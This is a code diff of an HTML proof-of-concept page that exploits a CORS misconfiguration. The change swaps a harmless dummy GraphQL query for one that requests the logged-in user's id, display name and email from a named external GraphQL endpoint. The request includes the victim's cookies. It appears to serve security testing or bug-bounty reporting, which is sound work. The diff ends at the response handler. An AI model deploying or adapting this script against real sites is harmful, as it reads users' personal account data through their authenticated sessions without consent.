@@ -4,15 +4,27 @@
         <h3>CORS PoC</h3>
 
         <script>
-            fetch("https://breakme.getincentify.com/graphql?AccountQuery", {
+            const target = "https://breakme.getincentify.com/graphql?AccountQuery";
+
+            const query = `
+            query AccountQuery {
+                me {
+                    id
+                    displayName
+                    hasDiscoveryMap
+                    isWorkOrdersEnabled
+                    email
+                }
+            }
+            `;
+
+            fetch(target, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({
-                    query: "{ __typename }" // dummy safe GraphQL query
-                }),
-                credentials: "include"
+                body: JSON.stringify({ query }),
+                credentials: "include"  // send cookies
             })
                 .then(async response => {
                     const text = await response.text();
